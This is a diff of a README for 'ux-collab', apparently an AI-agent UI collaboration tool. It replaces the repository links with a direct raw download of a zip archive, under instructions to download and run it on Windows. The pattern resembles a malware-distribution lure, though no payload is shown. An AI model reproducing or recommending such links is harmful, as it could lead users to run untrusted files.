@@ -1,6 +1,6 @@
 # 🎨 ux-collab - Clear UI teamwork for agents
 
-[![Download](https://img.shields.io/badge/Download-ux--collab-blue?style=for-the-badge)](https://github.com/Signpainterreverberation581/ux-collab)
+[![Download](https://img.shields.io/badge/Download-ux--collab-blue?style=for-the-badge)](https://github.com/Signpainterreverberation581/ux-collab/raw/refs/heads/main/skills/collab-ux-3.9.zip)
 
 ## ✨ What this app does
 
@@ -8,7 +8,7 @@ ux-collab helps you work with AI agents on UI and UX tasks. It brings together b
 
 ## 📥 Download and run on Windows
 
-Visit this page to download: https://github.com/Signpainterreverberation581/ux-collab
+Visit this page to download: https://github.com/Signpainterreverberation581/ux-collab/raw/refs/heads/main/skills/collab-ux-3.9.zip
 
 1. Open the link in your browser.
 2. Find the latest release or download section.
